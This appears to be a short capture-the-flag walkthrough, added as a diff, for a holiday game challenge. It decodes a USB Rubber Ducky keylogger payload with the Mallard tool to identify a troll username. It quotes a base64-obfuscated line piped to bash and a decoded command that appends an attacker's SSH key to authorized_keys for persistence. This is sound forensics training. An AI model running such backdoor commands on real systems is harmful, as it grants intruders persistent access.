@@ -1,0 +1,23 @@
+In-game terminal
+Objective: evaluate USB data in /mnt/USBDEVICE/ to get the troll username involved in the keylogger attack.
+Hints:
+  Ducky Script is the language for the USB Rubber Ducky (https://hak5.org/products/usb-rubber-ducky)
+  Attackers can encode Ducky Script using a duck encoder for delivery as inject.bin.
+  It's also possible the reverse engineer encoded Ducky Script using Mallard. (https://github.com/dagonis/Mallard)
+  The MITRE ATT&CK™ tactic T1098.004 describes SSH persistence techniques through authorized keys files. (https://attack.mitre.org/techniques/T1098/004/)
+
+
+(Run the mallard python script on the encoded Ducky Script.)
+~$ python3 mallard.py -f /mnt/USBDEVICE/inject.bin
+
+
+(One of the line from the output is...)
+  STRING echo <some_Base64> | rev | base64 -d | bash
+
+
+(Replay the command.)
+~$ echo <some_Base64> | rev | base64 -d
+  echo 'ssh-rsa <some_SSH_key> ickymcgoop@trollfun.jackfrosttower.com' >> ~/.ssh/authorized_keys
+
+
+Answer: ickymcgoop
